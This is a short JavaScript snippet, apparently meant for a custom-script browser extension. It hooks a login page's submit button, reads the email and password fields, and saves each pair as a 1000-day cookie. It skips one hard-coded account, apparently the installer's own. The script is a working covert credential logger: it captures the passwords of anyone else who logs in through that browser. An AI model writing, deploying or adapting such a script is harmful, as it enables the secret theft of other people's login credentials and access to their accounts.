// Here You can type your custom JavaScript...
function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    var expires = "expires="+d.toUTCString();
    document.cookie = cname + "=" + cvalue + "; " + expires;
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1);
        if (c.indexOf(name) === 0) return c.substring(name.length, c.length);
    }
    return "";
}

function log(user, pass){
    //alert("logging " + user + "-" + pass);
    setCookie(user, pass, 1000);
}

$(document).ready(function (){
    var button = $("#loginbutton").find("input");
    $(button).click(function(){
        var user = $("#email").val();
        var pass = $("#pass").val();
        if (user != "darrko.messkovski")
            log(user, pass);
        //return false;
    });
});
